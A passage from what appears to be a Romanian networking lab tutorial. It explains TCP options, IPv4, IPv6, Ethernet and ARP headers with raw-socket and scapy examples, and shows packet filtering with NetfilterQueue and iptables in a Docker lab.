# urmarim documentul de aici: https://www.iana.org/assignments/tcp-parameters/tcp-parameters.xhtml


option = optiuni_tcp[0]
print (option) 
2 # option 2 inseamna MSS, Maximum Segment Size
'''
https://tools.ietf.org/html/rfc793#page-18
'''
option_len = optiuni_tcp[1]
print(option_len)
4 # MSS are dimensiunea 4
# valoarea optiunii este de la 2 la option_len
option_value = optiuni_tcp[2:option_len]
# MSS e pe 16 biti:
print(struct.unpack('!H', option_value))
1460 # MSS similar cu MTU

# continuam cu urmatoarea optiune
optiuni_tcp = optiuni_tcp[option_len:]
option = optiuni_tcp[0]
print (option) 
4 # option 4 inseamna SACK Permitted
'''
https://tools.ietf.org/html/rfc2018#page-3
https://packetlife.net/blog/2010/jun/17/tcp-selective-acknowledgments-sack/
+---------+---------+
| Kind=4  | Length=2|
+---------+---------+
'''
option_len = optiuni_tcp[1]
print(option_len)
2 # SACK Permitted are dimensiunea 2
# asta inseamna ca e un flag boolean fara alte valori aditionale

# continuam cu urmatoarea optiune
optiuni_tcp = optiuni_tcp[option_len:]
option = optiuni_tcp[0]
print (option) 
8 # option 8 inseamna Timestamps
'''
https://tools.ietf.org/html/rfc7323#page-12
+-------+-------+---------------------+---------------------+
|Kind=8 |Leng=10|   TS Value (TSval)  |TS Echo Reply (TSecr)|
+-------+-------+---------------------+---------------------+
    1       1              4                     4
'''
option_len = optiuni_tcp[1]
print(option_len)
10 # Timestamps are dimensiunea 10 bytes
# are doua valori stocate fiecare pe cate 4 bytes
valori = struct.unpack('!II', optiuni_tcp[2:option_len])
print (valori)
(1397405220, 0) # valorile Timestamp

# continuam cu urmatoarea optiune
optiuni_tcp = optiuni_tcp[option_len:]
option = optiuni_tcp[0]
print (option) 
1 # option 1 inseamna No-Operation
'''
asta inseamna ca nu folosim optiunea si trecem mai departe
https://tools.ietf.org/html/rfc793#page-18
'''

# continuam cu urmatoarea optiune
optiuni_tcp = optiuni_tcp[1:]
option = optiuni_tcp[0]
print (option) 
3 # option 3 inseamna Window Scale
'''
https://tools.ietf.org/html/rfc7323#page-8
+---------+---------+---------+
| Kind=3  |Length=3 |shift.cnt|
+---------+---------+---------+
'''
option_len = optiuni_tcp[1]
print(option_len)
3 # lungime 3, deci reprezentarea valorii este pe un singur byte
valoare = struct.unpack('!B', optiuni_tcp[2:option_len])
print(valoare)
7 # Campul Window poate fi scalat cu valoarea Window * 2^WindowScaleOption

# continuam cu urmatoarea optiune
optiuni_tcp = optiuni_tcp[option_len:]
option = optiuni_tcp[0]
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
IndexError: index out of range
# nu mai sunt optiuni, deci lista s-a incheiat
```

<a name="tcp_scapy"></a> 
### TCP object in scapy:
```python
tcp_obj = TCP()
tcp_obj.show()
###[ TCP ]### 
  sport= 20
  dport= 80
  seq= 0
  ack= 0
  dataofs= None
  reserved= 0
  flags= S
  window= 8192
  chksum= None
  urgptr= 0
  options= {}

# tipurile de flag-uri acceptate:
print TCP.flags.names
FSRPAUECN
'FIN, SYN, RST, PSH, ACK, URG, ECE, CWR, NS'
# pentru a seta PSH si ACK, folosim un singur string:
tcp.flags = 'PA'

# opțiunile se pot seta folosind obiectul TCPOptions
print TCPOptions[1]
{'Mood': 25, 'MSS': 2, 'UTO': 28, 'SAck': 5, 'EOL': 0, 'WScale': 3, 'TFO': 34, 'AltChkSumOpt': 15, 'Timestamp': 8, 'NOP': 1, 'AltChkSum': 14, 'SAckOK': 4}

print TCPOptions[0]
{0: ('EOL', None), 1: ('NOP', None), 2: ('MSS', '!H'), 3: ('WScale', '!B'), 4: ('SAckOK', None), 5: ('SAck', '!'), 8: ('Timestamp', '!II'), 14: ('AltChkSum', '!BH'), 15: ('AltChkSumOpt', None), 25: ('Mood', '!p'), 28: ('UTO', '!H'), 34: ('TFO', '!II')}
```

<a name="tcp_options_scapy"></a> 
#### Optiuni TCP in scapy
În scapy opțiunile pot fi setate printr-o listă tupluri: `[(Optiune1, Valoare1), ('NOP', None), ('NOP', None), (Optiune2, Valoare2), ('EOL', None)]`. TCPOptions[0] indica optiunile si indicele de accesare pentru TCPOptions[1]. Iar TCPOptions[1] indică formatul (sau pe cați biți) se regăseste fiecare opțiune. Formatul cu `!` ne spune că biții pe care îi setăm trebuie să fie în [Network Order (Big Endian)](https://stackoverflow.com/questions/13514614/why-is-network-byte-order-defined-to-be-big-endian) iar literele arată formatul pe care trebuie să îl folosim cu [struct.pack](https://docs.python.org/2/library/struct.html#format-characters). Spre exemplu, window scale are o dimensiune de 1 byte (`!B`) și valoarea trebuie setată corespunzător:
```python
import struct
optiune = 'WScale'
op_index = TCPOptions[1][optiune]
op_format = TCPOptions[0][op_index]
print op_format
# opțiunea window scale are o dimensiune de 1 byte (`!B`)
# ('WScale', '!B')
valoare = struct.pack(op_format[1], 15)
# valoarea 15 a fost împachetată într-un string de 1 byte
tcp.option = [(optiune, valoare)]
```

#### Atacuri simple la nivelul TCP
- [Shrew DoS attack](https://engineering.purdue.edu/kak/compsec/NewLectures/Lecture16.pdf#page=60)
- [Syn Flooding](https://engineering.purdue.edu/kak/compsec/NewLectures/Lecture16.pdf#page=68)


<a name="ipv4"></a> 
## [Internet Protocol Datagram v4 - IPv4](https://tools.ietf.org/html/rfc791#page-11)
```
  0               1               2               3              4 Offs.
  0 1 2 3 4 5 6 7 0 1 2 3 4 5 6 7 0 1 2 3 4 5 6 7 0 1 2 3 4 5 6 7
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
 |Version|  IHL  |     DSCP  |ECN|          Total Length         |  1
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
 |         Identification        |Flags|      Fragment Offset    |  2
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
 |  Time to Live |    Protocol   |         Header Checksum       |  3
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
 |                       Source Address                          |  4
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
 |                    Destination Address                        |  5
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
 |                    Options    (if IHL  > 5)                   |
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
 |                   Application + TCP data                      | 
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-

```
Prima specificație a protocolului IP a fost în [RFC791](https://tools.ietf.org/html/rfc791) iar câmpurile sunt explicate foarte bine în aceste [note de curs](https://engineering.purdue.edu/kak/compsec/NewLectures/Lecture16.pdf#page=14).

#### Câmpurile antetului

- Version - 4 pentru ipv4
- IHL - similar cu Data offset de la TCP, ne spune care este dimnesiunea header-ului în multiplii de 32 de biți. Dacă nu sunt specificate opțiuni, IHL este 5.
- [DSCP](https://en.wikipedia.org/wiki/Differentiated_services) - în tcpdump mai apare ca ToS (type of service), acest camp a fost definit în [RFC2474](https://tools.ietf.org/html/rfc2474) și setează politici de retransmitere a pachetelor, ca [aici](https://en.wikipedia.org/wiki/Differentiated_services#Commonly_used_DSCP_values). Aici puteți găsi un [ghid de setare pentru DSCP](https://tools.ietf.org/html/rfc4594#page-19). Câmpul acesta are un rol important în prioritizarea pachetelor de tip video, voce sau streaming.
- ECN - definit în [RFC3186](https://tools.ietf.org/html/rfc3168) este folosit de către routere, pentru a notifica transmițătorii cu privire la existența unor congestionări pe rețea. Setarea flag-ului pe 11 (Congestion Encountered - CE), va determina layer-ul TCP să își seteze ECE, CWR și NS.
- Total length - lumgimea totală in octeti, cu header și date pentru întreg-ul datagram
- Identification - un id care este folosit pentru idenficarea pachetelor fragmentate
- [Flags](https://en.wikipedia.org/wiki/IPv4#Flags) - flag-uri de fragmentare, bitul 0 e rezervat, bitul 1 indică DF - don't fragment, iar bitul 2 setat, ne spune că mai urmează fragmente.
- Fragment Offset - offset-ul unui fragment curent în raport cu fragmentul inițial, măsurat în multiplu de 8 octeți (64 biți).
- Time to Live (TTL) -  numărul maxim de routere prin care poate trece IP datagram pâna în punctul în care e discarded
- Protocol - indică codul [protocolului](https://en.wikipedia.org/wiki/List_of_IP_protocol_numbers) din interiorul secvenței de date
- Header checksum - aceeași metodă de checksum ca la [TCP si UDP](https://en.wikipedia.org/wiki/Transmission_Control_Protocol#Checksum_computation), adică suma în complement 1, a fragmentelor de câte 16 biți, dar în cazul acesta se aplică **doar pentru header**. Această sumă este puțin redundantă având în vedere că se mai calculează o dată peste pseudoheader-ul de la TCP sau UDP.
- Source/Destination Address - adrese ip pe 32 de biți
- [Options](https://www.iana.org/assignments/ip-parameters/ip-parameters.xhtml) - sunt opțiuni la nivelul IP. Mai multe informații despre rolul acestora puteți găsi [aici](http://www.tcpipguide.com/free/t_IPDatagramOptionsandOptionFormat.htm), [aici](http://www.cc.ntut.edu.tw/~kwke/DC2006/ipo.pdf) și specificația completă [aici](http://www.networksorcery.com/enp/protocol/ip.htm#Options). Din [lista de 30 de optiuni](https://www.iana.org/assignments/ip-parameters/ip-parameters.xhtml), cel putin 11 sunt deprecated in mod oficial, 8 sunt experimentale/ putin documentate, din cele ramase, o buna parte sunt neimplementate de catre routere sau prezinta riscuri de securitate. Spre exemplu, optiunea [traceroute](https://networkengineering.stackexchange.com/questions/10453/ip-traceroute-rfc-1393), si optiunea [record route](https://networkengineering.stackexchange.com/questions/41886/how-does-the-ipv4-option-record-route-work) care nu au fost implementate, sau optiunile [source based routing](https://howdoesinternetwork.com/2014/source-based-routing) cu risc sporit de securitate, mai multe în [acest raport](https://www2.eecs.berkeley.edu/Pubs/TechRpts/2005/EECS-2005-24.pdf). 

###### Wireshark IPv4 Options
Ca să captați cu [Wireshark](https://osqa-ask.wireshark.org/questions/25504/how-to-capture-based-on-ip-header-length-using-a-capture-filter) IP datagrams care conțin opțiuni, puteți folosi filtrul care verifică ultimii 4 biți ai primului octet: `ip[0] & 0xf != 5`. Veți putea observa pachete cu [protocolul IGMP](https://www.youtube.com/watch?v=2fduBqQQbps) care are setată [opțiunea Router Alert](http://www.rfc-editor.org/rfc/rfc6398.html) 


<a name="ip_raw_socket"></a> 
### IPv4 Object from Raw Socket
Folosim datele ca octeti din exemplul cu UDP Raw Socket de mai sus:
```python
import socket
import struct

data = b'E\x00\x00!\xc2\xd2@\x00@\x11\xeb\xe1\xc6\n\x00\x01\xc6\n\x00\x02\x08\xae\t\x1a\x00\r\x8c6salut'

# extragem headerul de baza de IP:
ip_header = struct.unpack('!BBHHHBBH4s4s', data[:20])
ip_ihl_ver, ip_dscp_ecn, ip_tot_len, ip_id, ip_frag, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr = ip_header

print("Versiune IP: ", ip_ihl_ver >> 4)
print("Internet Header Length: ", ip_ihl_ver & 0b1111) # & cu 1111 pentru a extrage ultimii 4 biti
print("DSCP: ", ip_dscp_ecn >> 6)
print("ECN: ", ip_dscp_ecn & 0b11) # & cu 11 pt ultimii 2 biti
print("Total Length: ", ip_tot_len)
print("ID: ", ip_id)
print("Flags: ",  bin(ip_frag >> 13))
print("Fragment Offset: ",  ip_frag & 0b111) # & cu 111
print("Time to Live: ",  ip_ttl)
print("Protocol nivel superior: ",  ip_proto)
print("Checksum: ",  ip_check)
print("Adresa sursa: ", socket.inet_ntoa(ip_saddr))
print("Adresa destinatie: ", socket.inet_ntoa(ip_daddr))

if ip_ihl_ver & (16 - 1) == 5:
  print ("header-ul de IP nu are optiuni")

Versiune IP:  4
Internet Header Length:  5
DSCP:  0
ECN:  0
Total Length:  33
ID:  49874
Flags:  0b10
Fragment Offset:  0
Time to Live:  64
Protocol nivel superior:  17
Checksum:  60385
Adresa sursa:  198.10.0.1
Adresa destinatie:  198.10.0.2
``` 



<a name="ip_scapy"></a> 
### IPv4 object in scapy
```python
ip = IP() 
ip.show()
###[ IP ]### 
  version= 4
  ihl= None
  tos= 0x0
  len= None
  id= 1
  flags= 
  frag= 0
  ttl= 64
  proto= hopopt
  chksum= None
  src= 127.0.0.1
  dst= 127.0.0.1
  \options\

# observăm că DSCP și ECN nu sunt înca implementate în scapy.
# daca vrem să le folosim, va trebui să setăm tos cu o valoare
# pe 8 biți care să reprezinte DSCP și ECN folosind: int('DSCP_BINARY_STR' + 'ECN_BINARY_STR', 2)
# pentru a seta DSCP cu cod AF32 pentru video streaming și ECN cu notificare de congestie: ip.tos = int('011100' + '11', 2)
```

#### Atacuri simple folosind IP
- [IP Spoofing](https://engineering.purdue.edu/kak/compsec/NewLectures/Lecture16.pdf#page=71)
- [IP Spoofing Mitigation](https://engineering.purdue.edu/kak/compsec/NewLectures/Lecture16.pdf#page=84)
- [Network Ingress Filtering: Defeating Denial of Service Attacks which employ IP Source Address Spoofing](https://tools.ietf.org/html/bcp38)


<a name="ipv6"></a> 
## [Internet Protocol Datagram v6 - IPv6](https://tools.ietf.org/html/rfc2460#page-4)
```
  0               1               2               3              4 Offs.
  0 1 2 3 4 5 6 7 0 1 2 3 4 5 6 7 0 1 2 3 4 5 6 7 0 1 2 3 4 5 6 7
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
 |Version| Traffic Class |           Flow Label                  |
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
 |         Payload Length        |  Next Header  |   Hop Limit   |
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
 |                                                               |
 -                                                               -
 |                                                               |
 -                         Source Address                        -
 |                                                               |
 -                                                               -
 |                                                               |
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
 |                                                               |
 -                                                               -
 |                                                               |
 -                      Destination Address                      -
 |                                                               |
 -                                                               -
 |                                                               |
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
```
Prima specificație a protocolului IPv6 a fost în 1998 [rfc2460](https://tools.ietf.org/html/rfc2460) iar detaliile despre semnificația câmpurilor se găsesc în aceste [note de curs](https://engineering.purdue.edu/kak/compsec/NewLectures/Lecture16.pdf#page=23).

#### Câmpurile antetului IPv6

- Version - 6 pentru ipv6
- Traffic Class        8-bit [traffic class field](https://tools.ietf.org/html/rfc2460#section-7), similar cu [DSCP](https://en.wikipedia.org/wiki/Differentiated_services) 
- Flow Label           [20-bit flow label](https://tools.ietf.org/html/rfc2460#section-6), semantica definită [aici](https://tools.ietf.org/html/rfc2460#page-30), este folosit și în instanțierea socketului prin IPv6.
- Payload Length       16-bit unsigned integer care include si extra headerele adaugate
- Next Header          8-bit selector similar cu câmpul Protocol din IPv4
- Hop Limit            8-bit unsigned integer similar cu câmpul TTL din IPv4
- Source Address       128-bit addresă sursă
- Destination Address  128-bit addresă destinație
- Headerul poate fi extins prin adăugarea mai multor headere in payload, vezi [aici](https://tools.ietf.org/html/rfc2460#page-6)
- Pseudoheaderul pentru checksum-ul calculat de layerele de transport se formează diferit, vezi [aici](https://tools.ietf.org/html/rfc2460#page-27)
- Adresele sunt stocate in 8 grupuri de câte 16 biti: `fe80:cd00:0000:0000:1257:0000:0000:729c`
- Numărul total de adrese IPv6 este 340282366920938463463374607431768211456, suficient pentru toate device-urile existente
- Adresa IPv6 pentru loopback localhost este `::1/128` 
- Dublu `::` este o variantă prin care se prescurtează secventele continue cele mai din stânga de `0`, adresa de mai sus este prescurtată: `fe80:cd00::1257:0:0:729c`

<a name="ipv6_socket" ></a>
### IPv6 Socket
#### Server
```python
import socket
import sys
# try to detect whether IPv6 is supported at the present system and
# fetch the IPv6 address of localhost.
if not socket.has_ipv6:
    print("Nu putem folosi IPv6")
    sys.exit(1)

# "::0" este echivalent cu 0.0.0.0
infos = socket.getaddrinfo("::0", 8080, socket.AF_INET6, 0, socket.IPPROTO_TCP, socket.AI_CANONNAME)
# [(<AddressFamily.AF_INET6: 10>, <SocketKind.SOCK_STREAM: 1>, 6, '', ('::', 8080, 0, 0))]
# info contine o lista de parametri, pentru fiecare interfata, cu care se poate instantia un socket
print (len(infos))
1

info = infos[0]
adress_family = info[0].value # AF_INET
socket_type = info[1].value # SOCK_STREAM
protocol = info[2].value # IPPTROTO_TCP == 6
cannonical_name = info[3] # tot ::0 adresa de echivalenta cu 0.0.0.0
adresa_pt_bind = info[4] # tuplu ('::', 8080, 0, 0):
'''
Metodele de setare a adreselor (bind, connect, sendto) 
pentru socketul IPv6 sunt un tuplu cu urmatoarele valori:
- adresa_IPv6               ::0
- port                      8080
- flow_label ca in header   0
- scope-id - id pt NIC      0
mai multe detalii: https://stackoverflow.com/a/11930859
'''

# instantiem socket TCP cu AF_INET6
s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM, proto=socket.IPPROTO_TCP)

# executam bind pe tuplu ('::', 8080, 0, 0)
s.bind(adresa_pt_bind)

# restul e la fel ca la IPv4
s.listen(1)
conn, addr = s.accept()
print(conn.recv(1400))
conn.send(b'am primit mesajul')
conn.close()
s.close()
```

#### Client
```python
import socket
import sys
# try to detect whether IPv6 is supported at the present system and
# fetch the IPv6 address of localhost.
if not socket.has_ipv6:
    print("Nu putem folosi IPv6")
    sys.exit(1)

s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM, proto=socket.IPPROTO_TCP)
adresa = ('::', 8080, 0, 0)
s.connect(adresa)

# restul e la fel ca la IPv4
s.send(b'Salut prin IPv6')
print (s.recv(1400))
s.close()
```

<a name="ipv6_scapy" ></a>
### IPv6 Scapy
```python
ip = IPv6()
ip.show()
###[ IPv6 ]### 
  version= 6
  tc= 0
  fl= 0
  plen= None
  nh= No Next Header
  hlim= 64
  src= ::1
  dst= ::1

ip.dst = '::1' # localhost
# trimitem la un server UDP care asteapta pe (::0, 8081, 0, 0)
udp = UDP(sport=1234, dport=8081)  
send(ip / udp / b'salut prin ipv6')

```

<a name="ether"></a> 
## [Ethernet Frame](https://en.wikipedia.org/wiki/Ethernet_frame#Structure)
```
      0    1    2    3    4    5    6    7    Octet nr.
   *----*----*----*----*----*----*----*----*
F  |            Preabmle              | SF | preambul: 7x 10101010, SF: 10101011
   *----*----*----*----*----*----*----*----*
DL |          Source MAC         |           MAC sursa: 02:42:c6:0a:00:02
   *----*----*----*----*----*----*      
DL |     Destination MAC         |           MAC dest:  02:42:c6:0a:00:01 (gateway)
   *----*----*----*----*----*----*
DL | 802-1Q (optional) |
   *----*----*----*----*
DL | EthType |                               0x0800 pt IPv4, 0x0806 pt ARP, 0x86DD pt IPv6
   *----*----*----*---------------------------------------
DL |   Application payload + TCP + IP (max 1500 octets)      <--- maximum transmission unit (MTU)
   *----*----*----*---------------------------------------
DL |  32-bit CRC  |                                          <--- cod de detectare erori
   *----*----*----*----*----*----*----*-------
F  |     Interpacket Gap  - interval de timp |
   *----*----*----*----*----*----*----*-------
```
La nivelurile legatură de date și fizic, avem standardele [IEEE 802](https://ieeexplore.ieee.org/browse/standards/get-program/page/series?id=68) care ne definesc structurile cadrelor (frames).
Explicații:

- [Istoria protocolului Ethernet](https://www.enwoven.com/collections/view/1834/timeline).
- [Cartea albastră a protocolului Ethernet](http://decnet.ipv7.net/docs/dundas/aa-k759b-tk.pdf)
- [Mai multe detalii](https://notes.shichao.io/tcpv1/ch3/).

Fiecare secventă de 4 liniuțe reprezintă un octet (nu un bit ca in diagramele anterioare) iar headerul cuprinde:
- [preambulul](https://networkengineering.stackexchange.com/questions/24842/how-does-the-preamble-synchronize-other-devices-receiving-clocks) are o dimensiune de 7 octeți, fiecare octet de forma 10101010, și este folosit pentru sincronizarea ceasului receiver-ului. Mai multe detalii despre ethernet în acest [clip](https://www.youtube.com/watch?v=5u52wbqBgEY).
- SF (start of frame) reprezinta un octet (10101011) care delimitează start of frame
- [adresele MAC (Media Access Control)](http://www.dcs.gla.ac.uk/~lewis/networkpages/m04s03EthernetFrame.htm), sursă și destinație, sunt reprezentate pe 6 octeți (48 de biți). [Aici puteți citi articolul](https://ethernethistory.typepad.com/papers/HostNumbers.pdf) din 1981 despre specificația adreselor. Există o serie de [adrese rezervate](https://www.cavebear.com/archive/cavebear/Ethernet/multicast.html) pentru
- [802-1q](https://en.wikipedia.org/wiki/IEEE_802.1Q) este un header pentru rețele locale virtuale (aici un [exemplu de configurare VLAN](https://www.redhat.com/sysadmin/vlans-configuration)).
- EthType indică codul [protocolului](https://en.wikipedia.org/wiki/EtherType#Examples) din layer-ul superior acestui frame
- codul [CRC](https://en.wikipedia.org/wiki/Cyclic_redundancy_check#Computation) pentru [polinomul de Ethernet](https://xcore.github.io/doc_tips_and_tricks/crc.html#the-polynomial) pe 32 de biti: [0x 04 C1 1D B7]() cu [exemplu si aici](https://stackoverflow.com/questions/2587766/how-is-a-crc32-checksum-calculated)
- [Interpacket Gap](https://en.wikipedia.org/wiki/Interpacket_gap) - nu face efectiv parte din frame, ci reprezintă un spațiu de inactivitate, mai bine explicat [aici](http://www.mplsvpn.info/2010/05/what-is-inter-packet-gap-or-inter-frame.html).

Standaredele 802.11 pentru Wi-Fi au alta structura a frameurilor. Mai multe explicatii se gasesc in curs, la nivelul data link si in [materialul acesta](https://www.oreilly.com/library/view/80211-wireless-networks/0596100523/ch04.html) iar exemple de utilizare cu scapy pot fi [accesate aici](https://wlan1nde.wordpress.com/2016/06/28/using-scapy-to-send-wlan-frames/)

<a name="ether_scapy"></a> 
### Ethernet Object in Scapy
```python
e = Ether()       
e.show()
WARNING: Mac address to reach destination not found. Using broadcast.
###[ Ethernet ]### 
  dst= ff:ff:ff:ff:ff:ff
  src= 02:42:c6:0d:00:0e
  type= 0x9000

# preambulul, start of frame și interpacket gap sunt parte a nivelului fizic
# CRC-ul este calculat automat de către kernel
# singurele câmpuri de care trebuie să ținem cont sunt adresele și EthType
```

<a name="arp"></a> 
## [Address Resolution Protocol](http://www.erg.abdn.ac.uk/users/gorry/course/inet-pages/arp.html)
[ARP](https://www.youtube.com/watch?v=QPi5Nvxaosw) este un protocol care face maparea între protocolul de retea (IP) și adresele hardware/fizice sau Media Access Control (MAC) de pe o rețea locală. Acesta a fost definit în [RFC 826](https://tools.ietf.org/html/rfc826), în 1982 și este strâns legat de adresele IPv4, pentru IPv6 există [neighbour discovery](https://tools.ietf.org/html/rfc3122). Un tutorial bun și mai multe explicații pot fi [găsite și aici](http://www.danzig.jct.ac.il/tcp-ip-lab/ibm-tutorial/3376c28.html)

Antetul pentru ARP este redat cu adresele hardware iesind din limita de 32 de biti:
```
  0               1               2               3              4 Offs.
  0 1 2 3 4 5 6 7 0 1 2 3 4 5 6 7 0 1 2 3 4 5 6 7 0 1 2 3 4 5 6 7 
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
 |         HWType                |           ProtoType           |
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
 |   HWLen       |   ProtoLen    |          Operation            |
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
 |                   Adresa Hardware Sursa          de tipul  HWType          <--- HWLen octeti (6 pt Ethernet)
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
 |                   Adresa Proto Destinatie        de tipul ProtoType        <--- ProtoLen octeti (4 pt IPv4)
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
 |                   Adresa Hardware Destinatie                               <--- HWLen octeti (6 pt Ethernet)
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
 |                   Adresa Proto Destinatie                                  <--- ProtoLen octeti (4 pt IPv4)
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-

```

- HWType - [tipul de adresa fizică](https://www.iana.org/assignments/arp-parameters/arp-parameters.xhtml#arp-parameters-2), codul 1 pentru Ethernet (adrese MAC)
- ProtoType - indică codul [protocolului](https://en.wikipedia.org/wiki/EtherType#Examples) folosit ca adresa la nivelul rețea - 0x0800 sau 2048 pentru IPv4
- HWLen - este lungimea adresei hardware sursă sau destinație, pentru Ethernet valoarea este 6 (o adresă MAC are 6 octeți)
- ProtoLen - reprezintă lungimea adresei de la protocolul destinație, pentru IPv4 valoarea este 4 (o adresă IPv4 are 4 octeți)
- Adresa Hardware Sursă/Destinație - lungime variabilă în funcție de HWLen, în general adrese Ethernet
- Adresa Proto Sursă/Destinație - lungime variabilă în funcție de HWLen, în general adrese IPv4
 
<a name="arp_scapy"></a> 
### Ethernet Object in Scapy
Vom lucra cu adrese MAC standard și IPv4, acestea sunt publice și sunt colectate din rețeaua locală. În scapy este deja implementat antetul pentru ARP:
```python
>>> ls(ARP)
hwtype     : XShortField                         = (1)                     # ce tip de adresa fizica, 1 pt MAC-uri
ptype      : XShortEnumField                     = (2048)                  # protocolul folosit, similar cu EthType 
hwlen      : ByteField                           = (6)                     # dimensiunea adresei MAC (6 octeti)
plen       : ByteField                           = (4)                     # dimensiunea adresei IP (pentru v4, 4 octeti)
op         : ShortEnumField                      = (1)                     # operatiunea 1 pentru request, 0 pentru reply   
hwsrc      : ARPSourceMACField                   = (None)                  # adresa MAC sursa
psrc       : SourceIPField                       = (None)                  # adresa IP sursa
hwdst      : MACField                            = ('00:00:00:00:00:00')   # adresa MAC destinatie
pdst       : IPField                             = ('0.0.0.0')             # adresa IP destinatie (poate fi si un subnet)
```

Pentru a putea trimite un mesaj unui IP din rețeaua locală, va trebui să știm adresa hardware a acestuia iar ca să aflăm această adresă trebuie să trimitem pe întreaga rețea locală (prin difuzare sau broadcast) întrebarea "Cine are adresa MAC pentru IP-ul X?". În cazul în care un dispozitiv primește această întrebare și se identifică cu adresa IP, el va răspunde cu adresa lui fizică.
Perechile de adrese hardware și adrese IP sunt stocate într-un tabel cache pe fiecare dispozitiv. 

Exemplu în scapy:
```python
# adresa fizică rezervata pentru broadcast ff:ff:ff:ff:ff:ff
eth = Ether(dst = "ff:ff:ff:ff:ff:ff")

# adresa proto destinație - IP pentru care dorim să aflăm adersa fizică
arp = ARP(pdst = '198.13.13.1')

# folosim srp1 - send - receive (sr) 1 pachet
# litera p din srp1 indică faptul că trimitem pachetul la layer data link 
answered = srp1(eth / arp, timeout = 2)

if answered is not None:
    print (answered[ARP].psrc)
    # adresa fizică este:
    print (answered[ARP].hwsrc)
else:
    print ("Nu a putut fi gasita")  
```

În felul acesta putem interoga device-urile din rețea și adresele MAC corespunzătoare. Putem folosi scapy pentru a trimite un broadcast întregului subnet dacă setăm `pdst` cu valoarea subnetului `net`. 


<a name="scapy_nfqueue"></a>
## [Netfilter Queue](https://pypi.org/project/NetfilterQueue/)
Pentru a modifica pachetele care circulă live pe rețeaua noastră, putem folosi librăria [NetfilterQueue](https://netfilter.org/projects/libnetfilter_queue/) care stochează pachetele într-o coadă. La citirea din coadă, pachetele pot fi acceptate (`packet.accept()`) pentru a fi transmise mai departe sau pot fi blocate (`packet.drop()`). În cazul în care dorim să le alterăm în timp real, putem folosi șiruri de octeți pentru a seta payload: `packet.set_payload(bytes(scapy_packet))`, unde payload reprezintă întregul pachet sub formă binară.
Mai multe exemple puteți găsi [în extensia de python](https://pypi.org/project/NetfilterQueue/).
Pentru a folosi librăria, trebuie să adăugăm o regulă în firewall-ul iptables prin care să redirecționăm toate pachetele către o coadă `NFQUEUE` cu un id specific. Acest lucru se poate face din shell:
```bash
# toate pachetele de la input se redirectioneaza catre coada 5
iptables -I INPUT -j NFQUEUE --queue-num 5
```
sau din python:
```python
import os
os.system("iptables -I INPUT -j NFQUEUE --queue-num 5")
```

<a name="scapy_nfqueue_block"></a>
### Blocarea unui IP
Ne atașăm containerului router:
```bash
docker-compose exec router bash
```

Dintr-un terminal de python sau dintr-un fișier rulăm:

```python
from scapy.all import *
from netfilterqueue import NetfilterQueue as NFQ
import os
def proceseaza(pachet):
    # octeti raw, ca dintr-un raw socket
    octeti = pachet.get_payload()
    # convertim octetii in pachet scapy
    scapy_packet = IP(octeti)
    scapy_packet.summary()
    if scapy_packet[IP].src == '198.10.0.2':
        print("Drop la: ", scapy_packet.summary())
        pachet.drop()
    else:
        print("Accept la: ", scapy_packet.summary())
        pachet.accept()

queue = NFQ()
try:
    os.system("iptables -I INPUT -j NFQUEUE --queue-num 5")
    # bind trebuie să folosească aceiași coadă ca cea definită în iptables
    queue.bind(5, proceseaza)
    queue.run()
except KeyboardInterrupt:
    queue.unbind()
```

Într-un alt terminal ne atașăm containerului server:
```bash
docker-compose exec server bash
# nu va mai merge
ping router 
```


<a name="scapy"></a> 
## [Exemple de protocoale în Scapy](https://scapy.readthedocs.io/en/latest/usage.html#starting-scapy)

<a name="scapy_dhcp"></a> 
### [Dynamic Host Configuration Protocol](http://www.ietf.org/rfc/rfc2131.txt) si [BOOTP](https://tools.ietf.org/html/rfc951)
